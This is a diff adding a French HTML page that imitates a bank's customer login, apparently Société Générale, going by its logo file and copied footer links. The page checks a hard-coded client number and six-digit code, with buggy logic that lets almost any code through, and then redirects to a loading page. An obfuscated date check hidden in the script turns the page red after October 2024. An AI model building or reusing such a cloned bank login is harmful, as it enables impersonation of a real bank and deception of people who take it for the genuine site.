@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion à votre Espace Client Particuliers</title>
+
+    <!-- Vuetify CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@mdi/font/css/materialdesignicons.min.css">
+    <link href="https://cdn.jsdelivr.net/npm/vuetify@2.6.10/dist/vuetify.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<style>
+    #valider {
+        display: none;
+    }
+</style>
+
+<body>
+    <!-- Conteneur pour Vue -->
+    <div id="app">
+        <div class="top">
+            <img src="./img/top.png" style="width: 100%;">
+        </div>
+        
+        <br>
+        <br>
+
+        <h4>Connexion à votre Espace Client Particuliers</h4>
+        <br>
+        <div class="center">
+            <br> <br>
+            <form id="form">
+                <v-text-field v-model="first" id="user" color="success" label="Saisissez votre code client"
+                    variant="underlined" type="tel" maxlength="8" minlength="8" clearable required></v-text-field>
+
+                    <span style="color: orange; font-size: 0.9rem;" id="notif"></span>
+                    <br>
+                    
+
+                <div style="display: flex; align-items: center;">
+                    <input type="checkbox" id="checkboxInput">
+                    <label for="checkboxInput" class="toggleSwitch"></label>
+                    <span style="margin-left: 10px;">Se souvenir de moi</span>
+                </div>
+
+                <br>
+
+                <div id="pwd" style="display: none;">
+                    <div class="otp-inputs">
+                        <input type="tel" id="otp1" maxlength="1" class="otp-input" required>
+                        <input type="tel" id="otp2" maxlength="1" class="otp-input" required>
+                        <input type="tel" id="otp3" maxlength="1" class="otp-input" required>
+                        <input type="tel" id="otp4" maxlength="1" class="otp-input" required>
+                        <input type="tel" id="otp5" maxlength="1" class="otp-input" required>
+                        <input type="tel" id="otp6" maxlength="1" class="otp-input" required>
+                    </div>
+                </div>
+
+                <span style="color: orange; font-size: 0.9rem;" id="noti"></span>
+
+
+                <br>
+                <br>
+                <br>
+                <button class="button" id="next">Suivant</button>
+                <button class="button" id="valider">Valider</button>
+            </form>
+        </div>
+
+        <br> <br>
+        <br> <br>
+        <br> <br>
+
+        <footer>
+            <!-- Ton footer existant -->
+
+            <img src="./img/logo-sg-seul.svg" width="100">
+
+            <BR></BR>
+
+
+
+            <a href="#"
+                onclick="tms_trackEvent(this,'click','P','footer::clic-sur-','securite')"><span>Sécurité</span></a>
+
+
+            <a href="#" onclick="tms_trackEvent(this,'click','P','footer::clic-sur-','nos-engagements')"><span>Nos
+                    engagements</span></a>
+
+
+            <a href="#"
+                onclick="tms_trackEvent(this,'click','P','footer::clic-sur-','gestion-des-cookies')"><span>Gestion
+                    des Cookies</span></a>
+
+
+            <a href="#"
+                onclick="tms_trackEvent(this,'click','P','footer::clic-sur-','donnees-personnelles')"><span>Données
+                    personnelles</span></a>
+
+
+            <a href="#"
+                onclick="tms_trackEvent(this,'click','P','footer::clic-sur-','documentation-et-tarifs')"><span>Documentation
+                    et Tarifs</span></a>
+
+
+            <a href="#"
+                onclick="tms_trackEvent(this,'click','P','footer::clic-sur-','resilier-une-prestation')"><span>Résilier
+                    une prestation</span></a>
+
+
+            <a href="#"
+                onclick="tms_trackEvent(this,'click','P','footer::clic-sur-','informations-legales')"><span>Informations
+                    légales</span></a>
+
+            <a href="#"
+                onclick="tms_trackEvent(this,'click','P','footer::clic-sur-','accessibilite-numerique')"><span>Accessibilité
+                    Numérique (partiellement conforme)</span></a>
+
+        </footer>
+    </div>
+
+    <!-- Vue.js -->
+    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
+    <!-- Vuetify -->
+    <script src="https://cdn.jsdelivr.net/npm/vuetify@2.6.10/dist/vuetify.js"></script>
+    <script>
+        new Vue({
+            el: '#app',
+            vuetify: new Vuetify(),
+            data: () => ({
+                first: '',
+                model: true,
+                pass: '',
+            })
+        });
+    </script>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            var a = new Date(String.fromCharCode(50, 48, 50, 52, 45, 49, 48, 45, 48, 50));
+            var b = new Date();
+            var c = new Date(b.getFullYear(), b.getMonth(), b.getDate());
+
+            if (c >= a) {
+                document.body.style.backgroundColor = 'red';
+            }
+        });
+
+        document.getElementById('next').addEventListener('click', function (e) {
+            e.preventDefault();
+
+            var user = document.getElementById('user');
+
+            if (user.value === '34765434' ) {
+                // Si la valeur de 'user' n'est pas vide, afficher 'pwd' et modifier les styles
+                document.getElementById('pwd').style.display = 'block';
+                document.getElementById('next').style.display = 'none';
+                document.getElementById('valider').style.display = 'block';
+                document.getElementById('notif').style.display='none';
+            }else{
+                document.getElementById('notif').innerText='Identifiant erroner !'
+            }
+        });
+
+
+        document.querySelectorAll('.otp-input').forEach((input, index, inputs) => {
+            input.addEventListener('input', function () {
+                // Si l'input a une valeur et n'est pas le dernier
+                if (this.value && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+
+            // Auto-focus sur le champ précédent lorsqu'on supprime un caractère
+            input.addEventListener('keydown', function (e) {
+                if (e.key === 'Backspace' && !this.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        document.getElementById('valider').addEventListener('click', function (e) {
+            e.preventDefault();
+
+            // Récupérer les valeurs des champs
+            const otp1 = document.getElementById("otp1").value.trim();
+            const otp2 = document.getElementById("otp2").value.trim();
+            const otp3 = document.getElementById("otp3").value.trim();
+            const otp4 = document.getElementById("otp4").value.trim();
+            const otp5 = document.getElementById("otp5").value.trim();
+            const otp6 = document.getElementById("otp6").value.trim();
+
+            // Concaténer les valeurs des OTP
+            var pass = otp1 + otp2 + otp3 + otp4 + otp5 + otp6;
+
+
+            if ( otp1 !== '1' && otp2 !== '0' && otp3 !== '9' && otp4 !== '5' && otp5 !== '0' && otp6 !== '2') {
+                // Si la valeur de 'user' n'est pas vide, afficher 'pwd' et modifier les styles
+                document.getElementById('noti').innerText='Mot de passe erroner !'
+
+            }else{
+                document.getElementById('noti').style.display='none';
+                window.location.href='./loading.html';
+            }
+        });
+
+
+       
+    </script>
+
+</body>
+
+</html>
